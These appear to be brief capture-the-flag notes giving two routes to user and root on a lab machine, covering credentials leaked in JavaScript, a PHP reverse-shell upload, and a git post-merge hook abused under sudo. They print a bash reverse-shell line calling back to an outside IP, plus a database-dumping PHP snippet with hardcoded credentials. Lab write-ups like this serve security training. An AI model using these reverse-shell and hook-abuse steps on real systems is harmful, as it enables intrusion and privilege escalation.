<h1>Method1</h1>

                                                        USER
                                                        
                                                        
   Enumerate -> /bookmarks.html -> Creds in Javascript -> clave:11des0081x -> Enumerate -> sudo git pull used (Remember it) -> Upload reverese shell -> Visit /profiles/filename.php -> Rev shell
   
   
                                                        ROOT
                                                        
                                                        
   sudo -l -> git pull used -> Read:https://www.liquidlight.co.uk/blog/using-a-post-merge-git-hook-to-clean-up-old-branches/ -> copy .git to /tmp/Dir1 -> create file in .git/hooks/post-merge with rev shell -> perform sudo git pull
   
   post-merge
   ```
   #!/bin/bash
   /bin/bash -i >& /dev/tcp/10.10.16.57/1234 1>&2
   ```

<h1>Method2</h1>

                                                      USER
                                                      
Enumerate -> /bookmarks.html -> Creds in js ->Login -> Search of postgres snippet -> Execute it to get creds of clave -> ssh in as clave

                                                      ROOT
                                                      
 RE .exe -> get password -> root
 
 ```
 <?php
	$db_connection = pg_connect("host=localhost port=5432 dbname=profiles user=profiles password=profiles");
	$result = pg_query($db_connection,"SELECT * from profiles");
	$res=pg_fetch_all($result);
	print_r($res);
?>
```
